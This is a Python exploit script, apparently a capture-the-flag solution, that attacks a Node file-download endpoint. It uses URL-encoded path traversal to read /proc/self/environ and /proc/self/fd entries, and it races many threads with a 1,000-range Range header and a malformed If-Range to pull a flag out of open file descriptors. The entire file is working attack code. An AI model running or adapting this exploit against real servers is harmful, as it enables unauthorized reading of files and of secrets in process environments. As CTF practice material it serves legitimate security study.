#!/usr/bin/env python3
import sys
import re
import json
import threading
import time
import http.client
from urllib.parse import urlparse

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3002"

parsed = urlparse(TARGET)
HOST = parsed.hostname
PORT = parsed.port or (443 if parsed.scheme == "https" else 80)

FLAG_RE = re.compile(rb'GCUP\{[^}\x00\n]+\}')

TRAVERSE = "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e"
RANGE_HEADER = "bytes=" + ",".join(f"{i * 200}-{i * 200 + 9}" for i in range(1000))

found = threading.Event()
result = [None]
lock = threading.Lock()

DECOY_WORKERS = 6
ENVIRON_WORKERS = 6
PROBE_THREADS = 12


def mkconn():
    return http.client.HTTPConnection(HOST, PORT, timeout=15)


def index():
    c = mkconn()
    c.request("GET", "/api/gallery")
    r = c.getresponse()
    data = json.loads(r.read())
    c.close()
    return data


def file_size(name):
    c = mkconn()
    c.request("HEAD", f"/download/{name}")
    r = c.getresponse()
    r.read()
    c.close()
    try:
        return int(r.headers.get("Content-Length", 0))
    except ValueError:
        return 0


def cycle_worker(path, fast=False):
    # fast=True: fetch only bytes=0-99 so Node opens and closes the file FD
    # much faster over WAN than downloading the full decoy (358 KB × 71 ms RTT).
    c = mkconn()
    while not found.is_set():
        try:
            headers = {"Range": "bytes=0-99"} if fast else {}
            c.request("GET", path, headers=headers)
            r = c.getresponse()
            try:
                r.read()
            except Exception:
                c.close()
                c = mkconn()
        except Exception:
            try:
                c.close()
            except Exception:
                pass
            c = mkconn()


def probe_worker(fds):
    c = mkconn()
    idx = 0
    while not found.is_set():
        n = fds[idx % len(fds)]
        idx += 1
        path = f"/download/{TRAVERSE}%2fproc%2fself%2ffd%2f{n}"
        try:
            c.request("GET", path, headers={"Range": RANGE_HEADER, "If-Range": '"'})
            r = c.getresponse()
            cl = int(r.headers.get("Content-Length", 0) or 0)
            try:
                data = r.read()
            except http.client.IncompleteRead as exc:
                data = exc.partial
                c.close()
                c = mkconn()
            m = FLAG_RE.search(data)
            if m:
                with lock:
                    if not found.is_set():
                        result[0] = m.group(0).decode(errors="replace")
                        found.set()
                return
        except Exception:
            try:
                c.close()
            except Exception:
                pass
            c = mkconn()


files = index()
sizes = {f: file_size(f) for f in files}
decoy = max(sizes, key=sizes.get)
decoy_size = sizes[decoy]

print(f"[*] {TARGET}")
print(f"[*] decoy={decoy} ({decoy_size} bytes)")

# FD layout:
#   Node baseline                      : 0-18  (19 fds)
#   DECOY_WORKERS connections          : 19 .. 18+DECOY_WORKERS
#   ENVIRON_WORKERS connections        : 19+DECOY_WORKERS .. 18+DECOY_WORKERS+ENVIRON_WORKERS
#   PROBE_THREADS connections          : 19+D+E .. 18+D+E+PROBE_THREADS
#   file fds start at                  : 19+DECOY_WORKERS+ENVIRON_WORKERS+PROBE_THREADS
fd_base = 19 + DECOY_WORKERS + ENVIRON_WORKERS + PROBE_THREADS
probe_range = list(range(fd_base, fd_base + 32))
print(f"[*] workers={DECOY_WORKERS}+{ENVIRON_WORKERS} probe_threads={PROBE_THREADS} fd_range={probe_range[0]}-{probe_range[-1]}")
print("[*] racing ...\n")

threads = []
for _ in range(DECOY_WORKERS):
    t = threading.Thread(target=cycle_worker, args=(f"/download/{decoy}", True), daemon=True)
    t.start()
    threads.append(t)

for _ in range(ENVIRON_WORKERS):
    t = threading.Thread(
        target=cycle_worker,
        args=(f"/download/{TRAVERSE}%2fproc%2fself%2fenviron", False),
        daemon=True,
    )
    t.start()
    threads.append(t)

# Distribute fds across probe threads
chunks = [probe_range[i::PROBE_THREADS] for i in range(PROBE_THREADS)]
for chunk in chunks:
    t = threading.Thread(target=probe_worker, args=(chunk,), daemon=True)
    t.start()
    threads.append(t)

found.wait(timeout=600)

if result[0]:
    print(f"[+] {result[0]}")
else:
    print("[-] timed out (600 s)")
